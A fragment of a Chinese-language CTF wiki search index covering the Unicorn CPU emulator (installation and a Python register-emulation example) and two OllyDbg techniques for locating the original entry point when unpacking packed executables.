ADDRESS + len ( X86_CODE32 )) 28 29 # now print out some registers 30 print ( \"Emulation done. Below is the CPU context\" ) 31 32 r_ecx = mu . reg_read ( UC_X86_REG_ECX ) 33 r_edx = mu . reg_read ( UC_X86_REG_EDX ) 34 print ( \">>> ECX = 0x %x \" % r_ecx ) 35 print ( \">>> EDX = 0x %x \" % r_edx ) 36 37 except UcError as e : 38 print ( \"ERROR: %s \" % e ) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b: $ python test1.py Emulate i386 code Emulation done . Below is the CPU context >>> ECX = 0x1235 >>> EDX = 0x788f \u6837\u4f8b\u91cc\u7684\u6ce8\u91ca\u5df2\u7ecf\u975e\u5e38\u76f4\u89c2, \u4f46\u6211\u4eec\u8fd8\u662f\u5bf9\u6bcf\u4e00\u884c\u4ee3\u7801\u505a\u51fa\u89e3\u91ca: \u884c\u53f72~3: \u5728\u4f7f\u7528Unicorn\u524d\u5bfc\u5165 unicorn \u6a21\u5757. \u6837\u4f8b\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e9bx86\u5bc4\u5b58\u5668\u5e38\u91cf, \u6240\u4ee5\u4e5f\u9700\u8981\u5bfc\u5165 unicorn.x86_const \u6a21\u5757 \u884c\u53f76: \u8fd9\u662f\u6211\u4eec\u9700\u8981\u6a21\u62df\u7684\u4e8c\u8fdb\u5236\u673a\u5668\u7801, \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u8868\u793a, \u4ee3\u8868\u7684\u6c47\u7f16\u6307\u4ee4\u662f: \"INC ecx\" \u548c \"DEC edx\". \u884c\u53f79: \u6211\u4eec\u5c06\u6a21\u62df\u6267\u884c\u4e0a\u8ff0\u6307\u4ee4\u7684\u6240\u5728\u865a\u62df\u5730\u5740 \u884c\u53f714: \u4f7f\u7528 Uc \u7c7b\u521d\u59cb\u5316Unicorn, \u8be5\u7c7b\u63a5\u53d72\u4e2a\u53c2\u6570: \u786c\u4ef6\u67b6\u6784\u548c\u786c\u4ef6\u4f4d\u6570(\u6a21\u5f0f). \u5728\u6837\u4f8b\u4e2d\u6211\u4eec\u9700\u8981\u6a21\u62df\u6267\u884cx86\u67b6\u6784\u768432\u4f4d\u4ee3\u7801, \u6211 \u4eec\u4f7f\u7528\u53d8\u91cf mu \u6765\u63a5\u53d7\u8fd4\u56de\u503c. \u884c\u53f717: \u4f7f\u7528 mem_map \u65b9\u6cd5\u6839\u636e\u5728\u884c\u53f79\u5904\u58f0\u660e\u7684\u5730\u5740, \u6620\u5c042MB\u7528\u4e8e\u6a21\u62df\u6267\u884c\u7684\u5185\u5b58\u7a7a\u95f4. \u6240\u6709\u8fdb\u7a0b\u4e2d\u7684CPU\u64cd\u4f5c\u90fd\u5e94\u8be5\u53ea\u8bbf\u95ee\u8be5\u5185\u5b58\u533a\u57df. \u6620\u5c04\u7684\u5185\u5b58\u5177\u6709\u9ed8\u8ba4\u7684\u8bfb,\u5199\u548c\u6267\u884c\u6743\u9650. \u884c\u53f720: \u5c06\u9700\u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5199\u5165\u6211\u4eec\u521a\u521a\u6620\u5c04\u7684\u5185\u5b58\u4e2d. mem_write \u65b9\u6cd5\u63a5\u53d72\u4e2a\u53c2\u6570: \u8981\u5199\u5165\u7684\u5185\u5b58\u5730\u5740\u548c\u9700\u8981\u5199\u5165\u5185\u5b58\u7684\u4ee3\u7801. \u884c\u53f723~24: \u4f7f\u7528 reg_write \u65b9\u6cd5\u8bbe\u7f6e ECX \u548c EDX \u5bc4\u5b58\u5668\u7684\u503c \u884c\u53f727: \u4f7f\u7528 emu_start \u65b9\u6cd5\u5f00\u59cb\u6a21\u62df\u6267\u884c, \u8be5API\u63a5\u53d74\u4e2a\u53c2\u6570: \u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5730\u5740, \u6a21\u62df\u6267\u884c\u505c\u6b62\u7684\u5185\u5b58\u5730\u5740(\u8fd9\u91cc\u662f X86_CODE32 \u7684\u6700\u540e1\u5b57\u8282\u5904), \u6a21\u62df\u6267\u884c\u7684\u65f6\u95f4\u548c\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u6570\u76ee. \u5982\u679c\u6211\u4eec\u50cf\u6837\u4f8b\u4e00\u6837\u5ffd\u7565\u540e\u4e24\u4e2a\u53c2\u6570, Unicorn\u5c06\u4f1a\u9ed8\u8ba4\u4ee5\u65e0\u7a77\u65f6\u95f4\u548c\u65e0\u7a77\u6307\u4ee4\u6570\u76ee\u7684\u6761\u4ef6\u6765\u6a21\u62df\u6267\u884c\u4ee3\u7801. \u884c\u53f732~35: \u6253\u5370\u8f93\u51fa ECX \u548c EDX \u5bc4\u5b58\u5668\u7684\u503c. \u6211\u4eec\u4f7f\u7528\u51fd\u6570 reg_read \u6765\u8bfb\u53d6\u5bc4\u5b58\u5668\u7684\u503c. \u8981\u60f3\u67e5\u770b\u66f4\u591a\u7684python\u793a\u4f8b, \u53ef\u4ee5\u67e5\u770b\u6587\u4ef6\u5939 bindings/python \u4e0b\u7684\u4ee3\u7801. \u800cC\u7684\u793a\u4f8b\u5219\u53ef\u4ee5\u67e5\u770b sample \u6587\u4ef6\u5939\u4e0b\u7684\u4ee3\u7801. \u53c2\u8003\u94fe\u63a5 \u00b6 Unicorn Official Site Quick tutorial on programming with Unicorn - with C & Python.","title":"Unicorn Engine \u7b80\u4ecb"},{"location":"reverse/unicorn/introduction/#unicorn-engine","text":"","title":"Unicorn Engine\u7b80\u4ecb"},{"location":"reverse/unicorn/introduction/#unicorn","text":"Unicorn\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7, \u591a\u5e73\u53f0, \u591a\u67b6\u6784\u7684CPU\u6a21\u62df\u5668\u6846\u67b6. \u6211\u4eec\u53ef\u4ee5\u66f4\u597d\u5730\u5173\u6ce8CPU\u64cd\u4f5c, \u5ffd\u7565\u673a\u5668\u8bbe\u5907\u7684\u5dee\u5f02. \u60f3\u8c61\u4e00\u4e0b, \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\u4e8e\u8fd9\u4e9b\u60c5\u666f: \u6bd4\u5982\u6211\u4eec\u5355\u7eaf\u53ea\u662f\u9700\u8981\u6a21\u62df\u4ee3\u7801\u7684\u6267\u884c\u800c\u975e\u9700\u8981\u4e00\u4e2a\u771f\u7684CPU\u53bb\u5b8c\u6210\u90a3\u4e9b\u64cd\u4f5c, \u53c8\u6216\u8005\u60f3\u8981\u66f4\u5b89\u5168\u5730\u5206\u6790\u6076\u610f\u4ee3\u7801, \u68c0\u6d4b\u75c5\u6bd2\u7279\u5f81, \u6216\u8005\u60f3\u8981\u5728\u9006\u5411\u8fc7\u7a0b\u4e2d\u9a8c\u8bc1\u67d0\u4e9b\u4ee3\u7801\u7684\u542b\u4e49. \u4f7f\u7528CPU\u6a21\u62df\u5668\u53ef\u4ee5\u5f88\u597d\u5730\u5e2e\u52a9\u6211\u4eec\u63d0\u4f9b\u4fbf\u6377. \u5b83\u7684\u4eae\u70b9(\u8fd9\u4e5f\u5f52\u529f\u4e8eUnicorn\u662f\u57fa\u4e8e qemu \u800c\u5f00\u53d1\u7684)\u6709: \u652f\u6301\u591a\u79cd\u67b6\u6784: Arm, Arm64 (Armv8), M68K, Mips, Sparc, & X86 (include X86_64). \u5bf9Windows\u548c nix\u7cfb\u7edf(\u5df2\u786e\u8ba4\u5305\u542bMac OSX, Linux, BSD & Solaris)\u7684\u539f\u751f\u652f\u6301 \u5177\u6709\u5e73\u53f0\u72ec\u7acb\u4e14\u7b80\u6d01\u6613\u4e8e\u4f7f\u7528\u7684API \u4f7f\u7528JIT\u7f16\u8bd1\u6280\u672f, \u6027\u80fd\u8868\u73b0\u4f18\u5f02 \u4f60\u53ef\u4ee5\u5728 Black Hat USA 2015 \u83b7\u6089\u6709\u5173Unicorn\u5f15\u64ce\u7684\u66f4\u591a\u6280\u672f\u7ec6\u8282. Github\u9879\u76ee\u4e3b\u9875: unicorn \u5c3d\u7ba1\u5b83\u4e0d\u540c\u5bfb\u5e38, \u4f46\u5b83\u65e0\u6cd5\u6a21\u62df\u6574\u4e2a\u7a0b\u5e8f\u6216\u7cfb\u7edf, \u4e5f\u4e0d\u652f\u6301\u7cfb\u7edf\u8c03\u7528. \u4f60\u9700\u8981\u624b\u52a8\u6620\u5c04\u5185\u5b58\u5e76\u5199\u5165\u6570\u636e\u8fdb\u53bb, \u968f\u540e\u4f60\u624d\u80fd\u4ece\u6307\u5b9a\u5730\u5740\u5f00\u59cb\u6a21\u62df.","title":"\u4ec0\u4e48\u662fUnicorn\u5f15\u64ce"},{"location":"reverse/unicorn/introduction/#_1","text":"\u4ec0\u4e48\u65f6\u5019\u80fd\u591f\u7528\u5230Unicorn\u5f15\u64ce\u5462? \u4f60\u53ef\u4ee5\u8c03\u7528\u6076\u610f\u8f6f\u4ef6\u4e2d\u4e00\u4e9b\u6709\u8da3\u7684\u51fd\u6570, \u800c\u4e0d\u7528\u521b\u5efa\u4e00\u4e2a\u6709\u5bb3\u7684\u8fdb\u7a0b. \u7528\u4e8eCTF\u7ade\u8d5b \u7528\u4e8e\u6a21\u7cca\u6d4b\u8bd5 \u7528\u4e8egdb\u63d2\u4ef6, \u57fa\u4e8e\u4ee3\u7801\u6a21\u62df\u6267\u884c\u7684\u63d2\u4ef6 \u6a21\u62df\u6267\u884c\u4e00\u4e9b\u6df7\u6dc6\u4ee3\u7801","title":"\u5e94\u7528\u7684\u60c5\u666f"},{"location":"reverse/unicorn/introduction/#_2","text":"\u5b89\u88c5Unicorn\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528pip\u5b89\u88c5, \u53ea\u8981\u5728\u547d\u4ee4\u884c\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u5373\u53ef(\u8fd9\u662f\u9002\u5408\u4e8e\u559c\u7231\u7528python\u7684\u7528\u6237\u7684\u5b89\u88c5\u65b9\u6cd5, \u5bf9\u4e8e\u90a3\u4e9b\u60f3\u8981\u4f7f\u7528C\u7684\u7528\u6237, \u5219\u9700\u8981\u53bb\u5b98\u7f51\u67e5\u770b\u6587\u6863\u7f16\u8bd1\u6e90\u7801\u5305): pip install unicorn \u4f46\u5982\u679c\u4f60\u60f3\u7528\u6e90\u4ee3\u7801\u8fdb\u884c\u672c\u5730\u7f16\u8bd1\u7684\u8bdd, \u4f60\u9700\u8981\u5728 \u4e0b\u8f7d \u9875\u9762\u4e2d\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5305, \u7136\u540e\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u547d\u4ee4\u6267\u884c: *nix \u5e73\u53f0\u7528\u6237 $ cd bindings/python $ sudo make install Windows\u5e73\u53f0\u7528\u6237 cd bindings/python python setup.py install \u5bf9\u4e8eWindows, \u5728\u6267\u884c\u5b8c\u4e0a\u8ff0\u547d\u4ee4\u540e, \u8fd8\u9700\u8981\u5c06 \u4e0b\u8f7d \u9875\u9762\u7684 Windows core engine \u7684\u6240\u6709dll\u6587\u4ef6\u590d\u5236\u5230 C:\\locationtopython\\Lib\\site-packages\\unicorn \u4f4d\u7f6e\u5904.","title":"\u5982\u4f55\u5b89\u88c5"},{"location":"reverse/unicorn/introduction/#unicorn_1","text":"\u6211\u4eec\u5c06\u4f1a\u5c55\u793a\u5982\u4f55\u4f7f\u7528python\u8c03\u7528unicorn\u7684api\u4ee5\u53ca\u5b83\u662f\u5982\u4f55\u8f7b\u6613\u5730\u6a21\u62df\u4e8c\u8fdb\u5236\u4ee3\u7801. \u5f53\u7136\u8fd9\u91cc\u7528\u7684api\u4ec5\u662f\u4e00\u5c0f\u90e8\u5206, \u4f46\u5bf9\u4e8e\u5165\u95e8\u5df2\u7ecf\u8db3\u591f\u4e86. 1 from __future__ import print_function 2 from unicorn import * 3 from unicorn.x86_const import * 4 5 # code to be emulated 6 X86_CODE32 = b \" \\x41\\x4a \" # INC ecx; DEC edx 7 8 # memory address where emulation starts 9 ADDRESS = 0x1000000 10 11 print ( \"Emulate i386 code\" ) 12 try : 13 # Initialize emulator in X86-32bit mode 14 mu = Uc ( UC_ARCH_X86 , UC_MODE_32 ) 15 16 # map 2MB memory for this emulation 17 mu . mem_map ( ADDRESS , 2 * 1024 * 1024 ) 18 19 # write machine code to be emulated to memory 20 mu . mem_write ( ADDRESS , X86_CODE32 ) 21 22 # initialize machine registers 23 mu . reg_write ( UC_X86_REG_ECX , 0x1234 ) 24 mu . reg_write ( UC_X86_REG_EDX , 0x7890 ) 25 26 # emulate code in infinite time & unlimited instructions 27 mu . emu_start ( ADDRESS , ADDRESS + len ( X86_CODE32 )) 28 29 # now print out some registers 30 print ( \"Emulation done. Below is the CPU context\" ) 31 32 r_ecx = mu . reg_read ( UC_X86_REG_ECX ) 33 r_edx = mu . reg_read ( UC_X86_REG_EDX ) 34 print ( \">>> ECX = 0x %x \" % r_ecx ) 35 print ( \">>> EDX = 0x %x \" % r_edx ) 36 37 except UcError as e : 38 print ( \"ERROR: %s \" % e ) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b: $ python test1.py Emulate i386 code Emulation done . Below is the CPU context >>> ECX = 0x1235 >>> EDX = 0x788f \u6837\u4f8b\u91cc\u7684\u6ce8\u91ca\u5df2\u7ecf\u975e\u5e38\u76f4\u89c2, \u4f46\u6211\u4eec\u8fd8\u662f\u5bf9\u6bcf\u4e00\u884c\u4ee3\u7801\u505a\u51fa\u89e3\u91ca: \u884c\u53f72~3: \u5728\u4f7f\u7528Unicorn\u524d\u5bfc\u5165 unicorn \u6a21\u5757. \u6837\u4f8b\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e9bx86\u5bc4\u5b58\u5668\u5e38\u91cf, \u6240\u4ee5\u4e5f\u9700\u8981\u5bfc\u5165 unicorn.x86_const \u6a21\u5757 \u884c\u53f76: \u8fd9\u662f\u6211\u4eec\u9700\u8981\u6a21\u62df\u7684\u4e8c\u8fdb\u5236\u673a\u5668\u7801, \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u8868\u793a, \u4ee3\u8868\u7684\u6c47\u7f16\u6307\u4ee4\u662f: \"INC ecx\" \u548c \"DEC edx\". \u884c\u53f79: \u6211\u4eec\u5c06\u6a21\u62df\u6267\u884c\u4e0a\u8ff0\u6307\u4ee4\u7684\u6240\u5728\u865a\u62df\u5730\u5740 \u884c\u53f714: \u4f7f\u7528 Uc \u7c7b\u521d\u59cb\u5316Unicorn, \u8be5\u7c7b\u63a5\u53d72\u4e2a\u53c2\u6570: \u786c\u4ef6\u67b6\u6784\u548c\u786c\u4ef6\u4f4d\u6570(\u6a21\u5f0f). \u5728\u6837\u4f8b\u4e2d\u6211\u4eec\u9700\u8981\u6a21\u62df\u6267\u884cx86\u67b6\u6784\u768432\u4f4d\u4ee3\u7801, \u6211 \u4eec\u4f7f\u7528\u53d8\u91cf mu \u6765\u63a5\u53d7\u8fd4\u56de\u503c. \u884c\u53f717: \u4f7f\u7528 mem_map \u65b9\u6cd5\u6839\u636e\u5728\u884c\u53f79\u5904\u58f0\u660e\u7684\u5730\u5740, \u6620\u5c042MB\u7528\u4e8e\u6a21\u62df\u6267\u884c\u7684\u5185\u5b58\u7a7a\u95f4. \u6240\u6709\u8fdb\u7a0b\u4e2d\u7684CPU\u64cd\u4f5c\u90fd\u5e94\u8be5\u53ea\u8bbf\u95ee\u8be5\u5185\u5b58\u533a\u57df. \u6620\u5c04\u7684\u5185\u5b58\u5177\u6709\u9ed8\u8ba4\u7684\u8bfb,\u5199\u548c\u6267\u884c\u6743\u9650. \u884c\u53f720: \u5c06\u9700\u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5199\u5165\u6211\u4eec\u521a\u521a\u6620\u5c04\u7684\u5185\u5b58\u4e2d. mem_write \u65b9\u6cd5\u63a5\u53d72\u4e2a\u53c2\u6570: \u8981\u5199\u5165\u7684\u5185\u5b58\u5730\u5740\u548c\u9700\u8981\u5199\u5165\u5185\u5b58\u7684\u4ee3\u7801. \u884c\u53f723~24: \u4f7f\u7528 reg_write \u65b9\u6cd5\u8bbe\u7f6e ECX \u548c EDX \u5bc4\u5b58\u5668\u7684\u503c \u884c\u53f727: \u4f7f\u7528 emu_start \u65b9\u6cd5\u5f00\u59cb\u6a21\u62df\u6267\u884c, \u8be5API\u63a5\u53d74\u4e2a\u53c2\u6570: \u8981\u6a21\u62df\u6267\u884c\u7684\u4ee3\u7801\u5730\u5740, \u6a21\u62df\u6267\u884c\u505c\u6b62\u7684\u5185\u5b58\u5730\u5740(\u8fd9\u91cc\u662f X86_CODE32 \u7684\u6700\u540e1\u5b57\u8282\u5904), \u6a21\u62df\u6267\u884c\u7684\u65f6\u95f4\u548c\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u6570\u76ee. \u5982\u679c\u6211\u4eec\u50cf\u6837\u4f8b\u4e00\u6837\u5ffd\u7565\u540e\u4e24\u4e2a\u53c2\u6570, Unicorn\u5c06\u4f1a\u9ed8\u8ba4\u4ee5\u65e0\u7a77\u65f6\u95f4\u548c\u65e0\u7a77\u6307\u4ee4\u6570\u76ee\u7684\u6761\u4ef6\u6765\u6a21\u62df\u6267\u884c\u4ee3\u7801. \u884c\u53f732~35: \u6253\u5370\u8f93\u51fa ECX \u548c EDX \u5bc4\u5b58\u5668\u7684\u503c. \u6211\u4eec\u4f7f\u7528\u51fd\u6570 reg_read \u6765\u8bfb\u53d6\u5bc4\u5b58\u5668\u7684\u503c. \u8981\u60f3\u67e5\u770b\u66f4\u591a\u7684python\u793a\u4f8b, \u53ef\u4ee5\u67e5\u770b\u6587\u4ef6\u5939 bindings/python \u4e0b\u7684\u4ee3\u7801. \u800cC\u7684\u793a\u4f8b\u5219\u53ef\u4ee5\u67e5\u770b sample \u6587\u4ef6\u5939\u4e0b\u7684\u4ee3\u7801.","title":"\u4f7f\u7528unicorn\u7684\u5feb\u901f\u6307\u5357"},{"location":"reverse/unicorn/introduction/#_3","text":"Unicorn Official Site Quick tutorial on programming with Unicorn - with C & Python.","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"reverse/unpack/direct-oep/","text":"\u6240\u8c13\u7684\u4e00\u6b65\u5230\u8fbeOEP\u7684\u8131\u58f3\u65b9\u6cd5, \u662f\u6839\u636e\u6240\u8131\u58f3\u7684\u7279\u5f81, \u5bfb\u627e\u5176\u8ddd\u79bbOEP\u6700\u8fd1\u7684\u4e00\u5904\u6c47\u7f16\u6307\u4ee4, \u7136\u540e\u4e0bint3\u65ad\u70b9, \u5728\u7a0b\u5e8f\u8d70\u5230OEP\u7684\u65f6\u5019dump\u7a0b\u5e8f. \u5982\u4e00\u4e9b\u538b\u7f29\u58f3\u5f80\u5f80popad\u6307\u4ee4\u8ddd\u79bbOEP\u6216\u8005\u5927jmp\u7279\u522b\u8fd1, \u56e0\u6b64\u4f7f\u7528Ollydbg\u7684\u641c\u7d22\u529f\u80fd, \u53ef\u4ee5\u641c\u7d22\u58f3\u7684\u7279\u5f81\u6c47\u7f16\u4ee3\u7801, \u8fbe\u5230\u4e00\u6b65\u65ad\u70b9\u5230\u8fbeOEP\u7684\u6548\u679c. \u8981\u70b9 \u00b6 ctrl+f \u67e5\u627epopad ctrl+l \u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a\u5339\u914d\u5904 \u627e\u5230\u5339\u914d\u5904, \u786e\u8ba4\u662f\u58f3\u89e3\u538b\u5b8c\u6bd5\u5373\u5c06\u8df3\u8f6c\u5230OEP\u90e8\u5206, \u5219\u8bbe\u4e0b\u65ad\u70b9\u8fd0\u884c\u5230\u8be5\u5904 \u53ea\u9002\u7528\u4e8e\u6781\u5c11\u6570\u538b\u7f29\u58f3 \u793a\u4f8b \u00b6 \u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 3_direct2oep.zip \u8fd8\u662f\u7528\u7684\u539f\u5148\u7684notepad.exe\u6765\u793a\u4f8b, \u7528 Ollydbg \u6253\u5f00\u540e, \u6211\u4eec\u6309\u4e0b ctrl+f \u6765\u67e5\u627e\u6307\u5b9a\u7684\u5b57\u7b26\u4e32, \u50cf popad \u662f\u5178\u578b\u7684\u4e00\u4e2a\u7279\u5f81, \u6709\u90e8\u5206\u58f3\u5b83\u5c31\u5e38\u7528 popad \u6765\u6062\u590d\u72b6\u6001, \u6240\u4ee5\u5982\u4e0b\u56fe\u6240\u793a\u6765\u641c\u7d22 popad . \u5728\u672c\u4f8b\u4e2d, \u5f53\u641c\u7d22\u5230\u7684 popad \u4e0d\u7b26\u5408\u6211\u4eec\u7684\u8981\u6c42\u65f6, \u53ef\u4ee5\u6309\u4e0b ctrl+l \u6765\u641c\u7d22\u4e0b\u4e00\u4e2a\u5339\u914d\u5904, \u5927\u6982\u6309\u4e0b\u4e2a\u4e09\u56db\u6b21, \u6211\u4eec\u627e\u5230\u4e86\u8df3\u8f6c\u5230OEP\u7684\u4f4d\u7f6e\u5904.","title":"\u4e00\u6b65\u5230\u8fbe OEP \u6cd5"},{"location":"reverse/unpack/direct-oep/#_1","text":"ctrl+f \u67e5\u627epopad ctrl+l \u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a\u5339\u914d\u5904 \u627e\u5230\u5339\u914d\u5904, \u786e\u8ba4\u662f\u58f3\u89e3\u538b\u5b8c\u6bd5\u5373\u5c06\u8df3\u8f6c\u5230OEP\u90e8\u5206, \u5219\u8bbe\u4e0b\u65ad\u70b9\u8fd0\u884c\u5230\u8be5\u5904 \u53ea\u9002\u7528\u4e8e\u6781\u5c11\u6570\u538b\u7f29\u58f3","title":"\u8981\u70b9"},{"location":"reverse/unpack/direct-oep/#_2","text":"\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 3_direct2oep.zip \u8fd8\u662f\u7528\u7684\u539f\u5148\u7684notepad.exe\u6765\u793a\u4f8b, \u7528 Ollydbg \u6253\u5f00\u540e, \u6211\u4eec\u6309\u4e0b ctrl+f \u6765\u67e5\u627e\u6307\u5b9a\u7684\u5b57\u7b26\u4e32, \u50cf popad \u662f\u5178\u578b\u7684\u4e00\u4e2a\u7279\u5f81, \u6709\u90e8\u5206\u58f3\u5b83\u5c31\u5e38\u7528 popad \u6765\u6062\u590d\u72b6\u6001, \u6240\u4ee5\u5982\u4e0b\u56fe\u6240\u793a\u6765\u641c\u7d22 popad . \u5728\u672c\u4f8b\u4e2d, \u5f53\u641c\u7d22\u5230\u7684 popad \u4e0d\u7b26\u5408\u6211\u4eec\u7684\u8981\u6c42\u65f6, \u53ef\u4ee5\u6309\u4e0b ctrl+l \u6765\u641c\u7d22\u4e0b\u4e00\u4e2a\u5339\u914d\u5904, \u5927\u6982\u6309\u4e0b\u4e2a\u4e09\u56db\u6b21, \u6211\u4eec\u627e\u5230\u4e86\u8df3\u8f6c\u5230OEP\u7684\u4f4d\u7f6e\u5904.","title":"\u793a\u4f8b"},{"location":"reverse/unpack/esp/","text":"ESP\u5b9a\u5f8b\u6cd5\u662f\u8131\u58f3\u7684\u5229\u5668, \u662f\u5e94\u7528\u9891\u7387\u6700\u9ad8\u7684\u8131\u58f3\u65b9\u6cd5\u4e4b\u4e00. \u8981\u70b9 \u00b6 ESP\u5b9a\u5f8b\u7684\u539f\u7406\u5728\u4e8e\u5229\u7528\u7a0b\u5e8f\u4e2d\u5806\u6808\u5e73\u8861\u6765\u5feb\u901f\u627e\u5230OEP. \u7531\u4e8e\u5728\u7a0b\u5e8f\u81ea\u89e3\u5bc6\u6216\u8005\u81ea\u89e3\u538b\u8fc7\u7a0b\u4e2d, \u4e0d\u5c11\u58f3\u4f1a\u5148\u5c06\u5f53\u524d\u5bc4\u5b58\u5668\u72b6\u6001\u538b\u6808, \u5982\u4f7f\u7528 pushad , \u5728\u89e3\u538b\u7ed3\u675f\u540e, \u4f1a\u5c06\u4e4b\u524d\u7684\u5bc4\u5b58\u5668\u503c\u51fa\u6808, \u5982\u4f7f\u7528 popad . \u56e0\u6b64\u5728\u5bc4\u5b58\u5668\u51fa\u6808\u65f6, \u5f80\u5f80\u7a0b\u5e8f\u4ee3\u7801\u88ab\u6062\u590d, \u6b64\u65f6\u786c\u4ef6\u65ad\u70b9\u89e6\u53d1. \u7136\u540e\u5728\u7a0b\u5e8f\u5f53\u524d\u4f4d\u7f6e, \u53ea\u9700\u8981\u5c11\u8bb8\u5355\u6b65\u64cd\u4f5c, \u5c31\u5f88\u5bb9\u6613\u5230\u8fbe\u6b63\u786e\u7684OEP\u4f4d\u7f6e. \u7a0b\u5e8f\u521a\u8f7d\u5165\u5f00\u59cbpushad/pushfd \u5c06\u5168\u90e8\u5bc4\u5b58\u5668\u538b\u6808\u540e\u5c31\u8bbe\u5bf9ESP\u5bc4\u5b58\u5668\u8bbe\u786c\u4ef6\u65ad\u70b9 \u8fd0\u884c\u7a0b\u5e8f, \u89e6\u53d1\u65ad\u70b9 \u5220\u9664\u786c\u4ef6\u65ad\u70b9\u5f00\u59cb\u5206\u6790 \u793a\u4f8b \u00b6 \u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 2_esp.zip \u8fd8\u662f\u4e0a\u4e00\u7bc7\u7684\u793a\u4f8b, \u5165\u53e3\u4e00\u53e5 popad , \u6211\u4eec\u6309\u4e0bF8\u6267\u884c popad \u4fdd\u5b58\u5bc4\u5b58\u5668\u72b6\u6001, \u6211\u4eec\u53ef\u4ee5\u5728\u53f3\u8fb9\u7684\u5bc4\u5b58\u5668\u7a97\u53e3\u91cc\u53d1\u73b0 ESP \u5bc4\u5b58\u5668\u7684\u503c\u53d8\u4e3a\u4e86\u7ea2\u8272, \u4e5f\u5373\u503c\u53d1\u751f\u4e86\u6539\u53d8. \u6211\u4eec\u9f20\u6807\u53f3\u51fb ESP \u5bc4\u5b58\u5668\u7684\u503c, \u4e5f\u5c31\u662f\u56fe\u4e2d\u7684 0019FF64 , \u9009\u62e9 HW break[ESP] \u540e, \u6309\u4e0b F9 \u8fd0\u884c\u7a0b\u5e8f, \u7a0b\u5e8f\u4f1a\u5728\u89e6\u53d1\u65ad\u70b9\u65f6\u65ad\u4e0b. \u5982\u56fe\u6765\u5230\u4e86 0040D3B0 \u7684\u4f4d\u7f6e. \u8fd9\u91cc\u5c31\u662f\u4e0a\u4e00\u7bc7\u6211\u4eec\u5355\u6b65\u8ddf\u8e2a\u65f6\u5230\u8fbe\u7684\u4f4d\u7f6e, \u5269\u4f59\u7684\u5c31\u4e0d\u518d\u8d58\u8ff0.","title":"ESP \u5b9a\u5f8b\u6cd5"},{"location":"reverse/unpack/esp/#_1","text":"ESP\u5b9a\u5f8b\u7684\u539f\u7406\u5728\u4e8e\u5229\u7528\u7a0b\u5e8f\u4e2d\u5806\u6808\u5e73\u8861\u6765\u5feb\u901f\u627e\u5230OEP. \u7531\u4e8e\u5728\u7a0b\u5e8f\u81ea\u89e3\u5bc6\u6216\u8005\u81ea\u89e3\u538b\u8fc7\u7a0b\u4e2d, \u4e0d\u5c11\u58f3\u4f1a\u5148\u5c06\u5f53\u524d\u5bc4\u5b58\u5668\u72b6\u6001\u538b\u6808, \u5982\u4f7f\u7528 pushad , \u5728\u89e3\u538b\u7ed3\u675f\u540e, \u4f1a\u5c06\u4e4b\u524d\u7684\u5bc4\u5b58\u5668\u503c\u51fa\u6808, \u5982\u4f7f\u7528 popad . \u56e0\u6b64\u5728\u5bc4\u5b58\u5668\u51fa\u6808\u65f6, \u5f80\u5f80\u7a0b\u5e8f\u4ee3\u7801\u88ab\u6062\u590d, \u6b64\u65f6\u786c\u4ef6\u65ad\u70b9\u89e6\u53d1. \u7136\u540e\u5728\u7a0b\u5e8f\u5f53\u524d\u4f4d\u7f6e, \u53ea\u9700\u8981\u5c11\u8bb8\u5355\u6b65\u64cd\u4f5c, \u5c31\u5f88\u5bb9\u6613\u5230\u8fbe\u6b63\u786e\u7684OEP\u4f4d\u7f6e. \u7a0b\u5e8f\u521a\u8f7d\u5165\u5f00\u59cbpushad/pushfd \u5c06\u5168\u90e8\u5bc4\u5b58\u5668\u538b\u6808\u540e\u5c31\u8bbe\u5bf9ESP\u5bc4\u5b58\u5668\u8bbe\u786c\u4ef6\u65ad\u70b9 \u8fd0\u884c\u7a0b\u5e8f, \u89e6\u53d1\u65ad\u70b9 \u5220\u9664\u786c\u4ef6\u65ad\u70b9\u5f00\u59cb\u5206\u6790","title":"\u8981\u70b9"},{"location":"reverse/unpack/esp/#_2","text":"\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 2_esp.zip \u8fd8\u662f\u4e0a\u4e00\u7bc7\u7684\u793a\u4f8b, \u5165\u53e3\u4e00\u53e5 popad , \u6211\u4eec\u6309\u4e0bF8\u6267\u884c popad \u4fdd\u5b58\u5bc4\u5b58\u5668\u72b6\u6001, \u6211\u4eec\u53ef\u4ee5\u5728\u53f3\u8fb9\u7684\u5bc4\u5b58\u5668\u7a97\u53e3\u91cc\u53d1\u73b0 ESP \u5bc4\u5b58\u5668\u7684\u503c\u53d8\u4e3a\u4e86\u7ea2\u8272, \u4e5f\u5373\u503c\u53d1\u751f\u4e86\u6539\u53d8. \u6211\u4eec\u9f20\u6807\u53f3\u51fb ESP \u5bc4\u5b58\u5668\u7684\u503c, \u4e5f\u5c31\u662f\u56fe\u4e2d\u7684 0019FF64 , \u9009\u62e9 HW break[ESP] \u540e, \u6309\u4e0b F9 